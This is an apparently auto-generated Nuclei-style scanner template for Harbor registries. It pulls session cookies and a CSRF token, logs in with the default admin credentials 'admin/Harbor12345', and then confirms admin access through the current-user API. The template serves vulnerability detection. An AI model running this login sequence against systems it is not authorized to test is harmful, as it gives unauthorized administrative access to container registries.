id: poc-yaml-harbor-weak-password
info:
  name: Harbor Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
http:
  - raw:
      - |
        GET /c/login HTTP/1.1
        Host: {{Hostname}}
    extractors:
      - type: regex
        name: cookie1
        part: header
        internal: true
        regex:
          - "sid=(.*?);"
      - type: regex
        name: cookie2
        part: header
        internal: true
        regex:
          - "_gorilla_csrf=(.*?);"
      - type: regex
        name: token
        part: header
        internal: true
        regex:
          - "X-Harbor-Csrf-Token: (.*?)\\r\\n"
  - raw:
      - |
        POST /c/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: sid={{cookie1}}; _gorilla_csrf={{cookie2}}
        X-Harbor-Csrf-Token: {{token}}

        principal=admin&password=Harbor12345
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
        part: body
    extractors:
      - type: regex
        name: cookie3
        part: header
        internal: true
        regex:
          - "sid=(.*?);"
  - raw:
      - |
        GET /api/v2.0/users/current HTTP/1.1
        Host: {{Hostname}}
        Cookie: _gorilla_csrf={{cookie2}}; sid={{cookie3}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\"comment\":"
          - "\"username\":\"admin\""
        part: body
      - type: word
        words:
          - "application/json"
        part: header
